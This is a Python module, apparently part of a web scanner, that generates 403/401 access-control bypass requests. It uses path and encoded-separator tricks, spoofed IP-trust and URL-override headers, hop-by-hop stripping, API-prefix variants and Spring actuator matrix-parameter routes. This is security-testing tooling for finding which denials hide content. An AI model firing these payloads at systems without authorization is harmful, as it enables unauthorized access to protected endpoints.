"""403/401 bypass fold (the nomore403 idea, built in).

A 403 means "exists but denied" — often a thin ACL that a path/header/method
trick walks around. When a 403/401 is found, this emits a curated set of bypass
variants (the families nomore403/bypass-403 use); the scanner fires them and a
2xx that survives soft-404 verification — and isn't the homepage or the 403 page
itself — is reported as a real bypass, so the report says which 403s actually
hide content vs which are just a wall.

The payload lists below are a *curated* subset of nomore403's: the highest-signal
techniques, deduped, with the no-ops removed — so a WAF-throttled run spends its
budget on attempts that actually flip 403→200, not the long tail. Each variant is
(label, method, request_path, extra_headers).
"""

from __future__ import annotations

import re
from pathlib import Path

# The bundled default header-bypass wordlist (lives beside the scan wordlists).
DEFAULT_HEADER_WORDLIST = Path(__file__).resolve().parent.parent / "wordlists" / "403-headers.txt"


def load_header_pairs(path: Path | str | None = None) -> list[tuple[str, str]]:
    """Parse a header-bypass wordlist into deduped (name, value) pairs.

    Accepts both `Name: value` and `Name value` (space-separated) lines; blank
    lines and `#` comments are skipped. Dedup is by (lower-cased name, value) —
    HTTP header names are case-insensitive, so `X-Real-Ip`/`X-Real-IP` with the
    same value are the *same* request on the wire and firing both is pure waste.
    The first-seen casing is preserved. Returns [] if the file can't be read."""
    p = Path(path) if path else DEFAULT_HEADER_WORDLIST
    try:
        lines = p.expanduser().read_text(errors="replace").splitlines()
    except OSError:
        return []
    out: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # Split on whichever separator terminates the (space-free) header NAME
        # first: a colon for "Name: value", a space for "Name value". Picking the
        # earlier one keeps colons that belong to the VALUE intact — e.g. the
        # space-form "X-Forwarded-Host localhost:8080" must not split on the colon.
        ci, si = line.find(":"), line.find(" ")
        if ci != -1 and (si == -1 or ci < si):
            name, value = line[:ci], line[ci + 1:]
        elif si != -1:
            name, value = line[:si], line[si + 1:]
        else:
            continue                           # a bare token with no value — skip
        name, value = name.strip(), value.strip()
        if not name or not value:
            continue
        key = (name.lower(), value)
        if key in seen:
            continue
        seen.add(key)
        out.append((name, value))
    return out


# IP-trust headers — an ACL/WAF that allowlists an internal/edge address. The
# Cloudflare/cluster/edge headers come first: targets behind Cloudflare/AWS WAF
# trust these from the edge, so they're the highest-signal in practice.
_IP_HEADERS = (
    "CF-Connecting-IP", "Cluster-Client-IP", "True-Client-IP", "X-Forwarded-For",
    "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP",
    "Client-IP", "X-True-IP", "X-Original-Remote-Addr",
)

# Loopback spellings — a naive allowlist/WAF regex that matches "127.0.0.1" may
# miss these. Kept short; applied only to the most common header (X-Forwarded-For)
# so the header axis doesn't explode.
_IP_ALT_VALUES = ("127.1", "localhost")

# Single trust/override headers (name -> value).
_NAMED_HEADERS = {
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Forwarded-Host": "localhost",
    "X-Forwarded-Proto": "http",
    "X-Forwarded-Server": "localhost",
    "X-Host": "localhost",
    "Forwarded": "for=127.0.0.1;host=localhost;proto=http",
}

# Path suffixes appended to the target path. Dot/slash games, encoded separators,
# CR/LF/null, matrix params (`;`/`..;/` — Tomcat/Spring), double-encoding, the
# IIS backslash, and extension spoofs (defeat extension-based ACLs).
_SUFFIXES = (
    "/", "/.", "//", "/./", "%20", "%09", "%00", "%0a", "%0d", "%2f", "%252f",
    "..;/", ";/", "/..;/", ".;/", "..%2f", "%5c", "?", "~", "/*",
    ".json", ".html", ".css", ".php", ".aspx", ".xml",
)

# Prefix/mid forms — operate on the body (path without the leading slash). The
# server normalises these differently before vs after the ACL check.
_PREFIXES = ("/./", "//", "/%2e/", "/%2e%2e//", "/.;/")

# Hop-by-hop bypass (RFC 7230 §6.1): a header named in `Connection` MUST be
# removed by a conforming intermediary before forwarding. The potent form against
# a reverse-proxy CHAIN is SPOOF+STRIP: send a trusted
# value AND list the header in Connection, so the edge proxy allows on the value
# then strips it — the inner proxy / backend re-evaluates without it and may pass.
# (httpx sends the custom Connection value verbatim, confirmed.)
_HOP_SPOOF = {
    "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1",
    "X-Forwarded-Host": "localhost", "X-Forwarded-Proto": "http",
    "X-Forwarded-Server": "localhost", "Forwarded": "for=127.0.0.1;host=localhost",
    "X-ProxyUser-Ip": "127.0.0.1",
}
# Pure strip (no value) — for headers whose mere ABSENCE downstream flips the ACL.
_HOP_STRIP = ("X-Original-URL", "X-Rewrite-URL", "X-Forwarded", "Via")

# Encoded-separator bypass: a normalizer that decodes an overlong-UTF-8 (`%c0%af`),
# fullwidth (`%ef%bc%8f`), or IIS `%u` slash AFTER the ACL check resolves a path
# the ACL never matched — the "understand the stack" class.
_ENC_SEP = ("%c0%af", "%e0%80%af", "%ef%bc%8f", "%uff0f", "%25c0%25af")

# API version-prefix bypass: an ACL bound to `/admin` may not cover `/v1/admin`
# (or vice-versa) when the app routes both to the same handler.
_API_PREFIXES = ("v1", "v2", "v3", "api", "v1.0", "latest", "internal")
_VER_SEG = re.compile(r"/(?:v\d+(?:\.\d+)?|api)(?=/)", re.I)   # a version-ish path segment to strip

# Matrix-param management bypass: reach a blocked actuator/JMX endpoint through a
# `;/` matrix segment carried on a *mapped* controller route. A Spring Security
# rule (or gateway ACL) that string-matches `/actuator/**` is evaluated BEFORE
# Spring MVC strips the `;matrix` content — so `/rest/v1/;/actuator/env` is
# authorized as the allowed `/rest/v1` yet still dispatched to the actuator
# endpoint. High-signal on Spring/Java stacks; the caller gates it to
# management-ish paths so it never inflates an ordinary 403's budget.
_MGMT_MATRIX_PREFIXES = ("rest/v1", "rest/v2", "rest/v1/v2", "rest", "api",
                         "api/v1", "api/v2", "v1", "v2")
_MGMT_HINT = re.compile(
    r"(?:^|/)(?:actuator|management|monitoring|jolokia|heapdump|threaddump|beans|"
    r"configprops|mappings|loggers|env|metrics|gateway|prometheus)(?:/|$)", re.I)


def load_prefixes(path: Path | str) -> tuple[str, ...]:
    """Parse a route-prefix wordlist (one mount per line) for --bypass-prefixes.

    Each line is a path prefix the operator knows the app mounts (`rest/v1`,
    `/gateway`, `services/api`…); leading/trailing slashes are stripped, blank
    lines and `#` comments skipped, order-preserving dedup. These feed BOTH the
    api-prefix and matrix-management families as extra carriers, on top of the
    curated seeds and any 2xx routes the scan discovered. Returns () on error."""
    try:
        lines = Path(path).expanduser().read_text(errors="replace").splitlines()
    except OSError:
        return ()
    out: list[str] = []
    seen: set[str] = set()
    for line in lines:
        line = line.strip().strip("/")
        if not line or line.startswith("#") or line in seen:
            continue
        seen.add(line)
        out.append(line)
    return tuple(out)


def is_management_path(path: str) -> bool:
    """True when `path` looks like a Spring/JMX management endpoint — the class
    the matrix-param prefix bypass targets (actuator, jolokia, gateway…)."""
    return bool(_MGMT_HINT.search(path))


def _swapcase(p: str) -> str:
    return "/" + p.lstrip("/").swapcase()


def variants(path: str, case_insensitive: bool = False,
             header_pairs: list[tuple[str, str]] | None = None, *,
             intensity: str = "auto", encoded: bool = True, api: bool = True,
             mgmt: bool = False, route_prefixes: tuple[str, ...] = (),
             ) -> list[tuple[str, str, str, dict]]:
    """Curated 403-bypass attempts for `path` (deduped, order = likelihood).

    `case_insensitive=True` (a Windows/IIS host, where the ACL ignores case too)
    drops the upper/swapcase path tricks — they'd hit the same resource and the
    same denial, so firing them just wastes the (WAF-throttled) budget.

    `header_pairs` (from `load_header_pairs`, i.e. `--bypass-headers`) REPLACES
    the built-in IP-trust header axis with the user's curated list — the path,
    URL-override and method tricks are kept.

    `intensity` controls the advanced families on top of the always-on core
    (path tricks / IP+override headers / method swap):
      * "light" — core only (fewest requests, classic high-signal);
      * "auto"  — core + hop-by-hop (universal) + encoded-separator IF `encoded`
                  + API-prefix IF `api` (the gates are set from the fingerprint by
                  the caller, so stack-specific tricks fire only where they fit);
      * "full"  — everything, gates ignored (exhaustive).

    `route_prefixes` are real route mounts the scan already confirmed (2xx dirs);
    they feed BOTH the api-prefix family (`/<route>/blocked`) and the matrix
    management family (`/<route>/;/blocked`), so those aren't limited to the
    static seed lists — app-specific mounts are covered from observed data.
    """
    inc_hop = intensity in ("auto", "full")
    inc_enc = intensity == "full" or (intensity == "auto" and encoded)
    inc_api = intensity == "full" or (intensity == "auto" and api)
    p = "/" + path.lstrip("/")
    body = p.lstrip("/")
    out: list[tuple[str, str, str, dict]] = []
    seen: set[tuple] = set()

    def add(label: str, method: str, rpath: str, headers: dict) -> None:
        if not rpath:
            return
        # never emit the plain original request (it's the 403 we're bypassing)
        if method == "GET" and rpath == p and not headers:
            return
        key = (method, rpath, frozenset(headers.items()))
        if key in seen:
            return
        seen.add(key)
        out.append((label, method, rpath, headers))

    # --- path manipulation (GET, no extra headers) ---
    for suf in _SUFFIXES:
        add(f"path {p}{suf}", "GET", p + suf, {})
    for pre in _PREFIXES:
        add(f"path {pre}{body}", "GET", pre + body, {})
    if not case_insensitive:                       # pointless on a case-insensitive ACL
        add(f"path {p.upper()}", "GET", p.upper(), {})
        add(f"path {_swapcase(p)}", "GET", _swapcase(p), {})

    # --- header injection (same path) ---
    if header_pairs:                               # user wordlist replaces the built-in axis
        for h, val in header_pairs:
            add(f"header {h}: {val}", "GET", p, {h: val})
    else:
        for h in _IP_HEADERS:
            add(f"header {h}: 127.0.0.1", "GET", p, {h: "127.0.0.1"})
        for val in _IP_ALT_VALUES:                 # extra loopback spellings on the common header
            add(f"header X-Forwarded-For: {val}", "GET", p, {"X-Forwarded-For": val})
        for h, val in _NAMED_HEADERS.items():
            add(f"header {h}: {val}", "GET", p, {h: val})
    add(f"header Referer: {p}", "GET", p, {"Referer": p})
    # URL-override family: request a path we CAN reach (root), point the header at
    # the blocked target — the backend rewrites to it behind the front-end ACL.
    for h in ("X-Original-URL", "X-Rewrite-URL", "X-HTTP-DestinationURL", "Request-URI"):
        add(f"header {h}", "GET", "/", {h: p})

    # --- hop-by-hop bypass — spoof a trusted value AND name it in
    # Connection so the edge allows then strips it (proxy-chain desync); plus a
    # pure-strip set and one batch strip of the whole proxy-header surface ---
    if inc_hop:
        for h, val in _HOP_SPOOF.items():
            add(f"hop-by-hop spoof+strip {h}", "GET", p, {h: val, "Connection": f"close, {h}"})
        for h in _HOP_STRIP:
            add(f"hop-by-hop strip {h}", "GET", p, {"Connection": f"close, {h}"})
        add("hop-by-hop strip proxy-set", "GET", p,
            {"Connection": "close, " + ", ".join(_HOP_SPOOF)})

    # --- encoded-separator bypass — overlong/fullwidth/%u slashes the ACL won't
    # match but a downstream normalizer decodes (leading, trailing, and mid-path).
    # Gated to IIS/Tomcat/Java/unknown stacks (where such normalizers live). ---
    if inc_enc:
        for sep in _ENC_SEP:
            add(f"enc-sep {p}{sep}", "GET", p + sep, {})
            add(f"enc-sep /{sep}{body}", "GET", "/" + sep + body, {})
        if "/" in body:
            head, _, tail = body.rpartition("/")
            for sep in _ENC_SEP:
                add(f"enc-sep mid {sep}", "GET", "/" + head + sep + tail, {})

    # --- API version-prefix bypass — add a version segment the ACL may not cover,
    # and (if the path already has one) strip it. Gated to API-ish targets. ---
    if inc_api:
        # Curated version seeds PLUS any real route prefixes the scan observed
        # (`route_prefixes`) — so this isn't limited to a static guess list; the
        # data-driven part covers app-specific mounts (/rest/v1, /gateway…).
        for ver in dict.fromkeys(_API_PREFIXES + tuple(route_prefixes)):
            seg = ver.strip("/")
            if seg:
                add(f"api-prefix /{seg}{p}", "GET", f"/{seg}{p}", {})
        stripped = _VER_SEG.sub("", p, count=1)
        if stripped and stripped != p:
            add(f"api-strip {stripped}", "GET", stripped, {})

    # --- matrix-param management bypass — carry the blocked management path on a
    # mapped route + `;/` so the ACL authorizes the route while MVC dispatches to
    # the endpoint. Curated Spring route guesses plus any real 2xx routes the
    # caller discovered (`mgmt_prefixes`); "" is the bare-root `/;/…` form. ---
    if mgmt:
        for pre in dict.fromkeys(("",) + _MGMT_MATRIX_PREFIXES + tuple(route_prefixes)):
            pre = pre.strip("/")
            rpath = f"/;/{body}" if not pre else f"/{pre}/;/{body}"
            add(f"matrix-bypass {rpath}", "GET", rpath, {})

    # --- method swap (only verbs that can return the *content*; HEAD/OPTIONS
    # return no body and TRACE just echoes, so they'd be false bypasses). Verb
    # *casing* tricks are intentionally omitted: httpx normalises the method to
    # upper-case on the wire, so a lower-case verb would just re-send the GET. ---
    for meth in ("POST", "PATCH"):
        add(f"method {meth}", meth, p, {})

    return out
